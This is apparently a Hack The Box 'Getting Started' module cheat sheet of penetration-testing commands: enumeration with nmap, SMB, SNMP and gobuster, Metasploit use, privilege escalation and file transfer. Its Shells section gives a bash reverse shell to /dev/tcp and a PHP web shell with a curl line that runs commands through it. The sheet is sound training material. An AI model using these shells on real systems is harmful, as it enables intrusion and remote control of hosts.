# 🚀 Getting Started Reference

> Quick reference for the essential commands, tools, and techniques introduced in the **Getting Started** module.

---

# VPN & Networking

| Command | Description |
|---------|-------------|
| `sudo openvpn user.ovpn` | Connect to the Hack The Box VPN. |
| `ifconfig` / `ip a` | Display network interfaces and IP addresses. |
| `netstat -rn` | Display the routing table and reachable networks. |

---

# Remote Access

| Command | Description |
|---------|-------------|
| `ssh user@10.10.10.10` | Connect to a remote host via SSH. |
| `ftp 10.10.10.10` | Connect to an FTP server. |

---

# tmux

| Command | Description |
|---------|-------------|
| `tmux` | Start a new tmux session. |
| `Ctrl+b` | Default tmux prefix key. |
| `Prefix + c` | Create a new window. |
| `Prefix + 1` | Switch to window 1. |
| `Prefix + %` | Split the current pane vertically. |
| `Prefix + "` | Split the current pane horizontally. |
| `Prefix + →` | Move to the pane on the right. |

---

# Vim

| Command | Description |
|---------|-------------|
| `vim file` | Open a file with Vim. |
| `i` | Enter Insert mode. |
| `Esc` | Return to Normal mode. |
| `x` | Delete a character. |
| `dw` | Delete a word. |
| `dd` | Delete a line. |
| `yw` | Copy a word. |
| `yy` | Copy a line. |
| `p` | Paste copied text. |
| `:1` | Jump to line 1. |
| `:w` | Save the file. |
| `:q` | Quit Vim. |
| `:q!` | Quit without saving. |
| `:wq` | Save and quit. |

---

# Service Enumeration

## Nmap

| Command | Description |
|---------|-------------|
| `nmap <IP>` | Perform a basic port scan. |
| `nmap -sV -sC -p- <IP>` | Scan all TCP ports, detect service versions, and run default NSE scripts. |
| `locate scripts/citrix` | Locate installed NSE scripts. |
| `nmap --script smb-os-discovery.nse -p445 <IP>` | Run a specific NSE script. |

## Netcat

| Command | Description |
|---------|-------------|
| `nc <IP> 22` | Connect to a port and grab the service banner. |

## SMB

| Command | Description |
|---------|-------------|
| `smbclient -N -L //<IP>` | List SMB shares anonymously. |
| `smbclient //<IP>/users` | Connect to an SMB share. |

## SNMP

| Command | Description |
|---------|-------------|
| `snmpwalk -v2c -c public <IP>` | Enumerate SNMP information. |
| `onesixtyone -c dict.txt <IP>` | Brute-force SNMP community strings. |

---

# Web Enumeration

| Command | Description |
|---------|-------------|
| `gobuster dir -u http://IP -w wordlist.txt` | Discover directories and files. |
| `gobuster dns -d domain.com -w wordlist.txt` | Enumerate subdomains. |
| `curl -IL https://domain.com` | Retrieve HTTP response headers. |
| `whatweb <IP>` | Identify web technologies. |
| `curl http://IP/robots.txt` | Retrieve the robots.txt file. |
| `Ctrl+U` | View the page source in Firefox. |

---

# Public Exploits

| Command | Description |
|---------|-------------|
| `searchsploit <software>` | Search Exploit-DB for public exploits. |
| `msfconsole` | Launch Metasploit Framework. |
| `search exploit <keyword>` | Search for exploit modules. |
| `use exploit/...` | Select an exploit module. |
| `show options` | Display required module options. |
| `set RHOSTS <IP>` | Set the target host. |
| `check` | Check if the target is vulnerable. |
| `exploit` | Launch the exploit. |

---

# Shells

| Command | Description |
|---------|-------------|
| `nc -lvnp 1234` | Start a Netcat listener. |
| `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` | Bash reverse shell. |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to a fully interactive TTY. |
| `Ctrl+Z → stty raw -echo → fg` | Improve shell interaction. |
| `echo "<?php system($_GET['cmd']);?>" > shell.php` | Create a PHP web shell. |
| `curl http://IP/shell.php?cmd=id` | Execute commands through the web shell. |

---

# Privilege Escalation

| Command | Description |
|---------|-------------|
| `./linpeas.sh` | Run LinPEAS to enumerate privilege escalation vectors. |
| `sudo -l` | List sudo permissions. |
| `sudo -u user <command>` | Execute a command as another user. |
| `sudo su -` | Switch to the root user. |
| `sudo su user -` | Switch to another user. |
| `ssh-keygen -f key` | Generate an SSH key pair. |
| `ssh root@IP -i key` | Authenticate using the generated private key. |

---

# File Transfer

| Command | Description |
|---------|-------------|
| `python3 -m http.server 8000` | Start a local HTTP server. |
| `wget http://IP:8000/file` | Download a file. |
| `curl http://IP:8000/file -o file` | Download a file using curl. |
| `scp file user@host:/tmp/` | Transfer a file via SCP. |
| `base64 file -w0` | Encode a file in Base64. |
| `base64 -d file.b64 > file` | Decode a Base64 file. |
| `md5sum file` | Verify file integrity using an MD5 hash. |

---

# Key Takeaways

- Always enumerate before attempting exploitation.
- Save scan results for future analysis.
- Upgrade unstable shells to interactive TTYs whenever possible.
- Verify transferred files using checksums.
- Document every command and finding during an engagement.